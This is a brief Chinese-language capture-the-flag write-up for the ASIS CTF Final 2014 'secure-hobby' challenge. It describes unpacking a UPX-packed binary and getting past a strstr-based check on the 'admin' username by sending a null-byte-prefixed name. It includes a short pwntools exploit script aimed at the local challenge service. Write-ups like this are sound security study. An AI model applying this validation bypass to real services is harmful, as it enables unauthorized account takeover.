# asis ctf final 2014 - Notes

## secure-hobby

丟 ida pro 用 shift f12 可以看到 upx

所以要先脫殼

他是一個 socket 開在 localhost:35565

本地測試會需要在當前目錄下創兩個檔案
1. flag
2. namak

簡單看一下程式碼可以知道，要得到 admin 的 key 就可以 get flag

不過在 register 的時候不可以打 admin ，不過在 register 那邊的程式碼

他判斷的方式是用 strstr 來看你的輸入名稱是不是 admin

所以可以透過輸入 `\x00admin` 來繞過

所以 solution:

```python
#!/usr/bin/env python
from pwn import *

HOST = '127.0.0.1'
PORT = 35565
r = remote(HOST, PORT)

print r.recvrepeat(0.3)
r.sendline('1')
r.sendlineafter(':', '\x00admin')

r.interactive()
```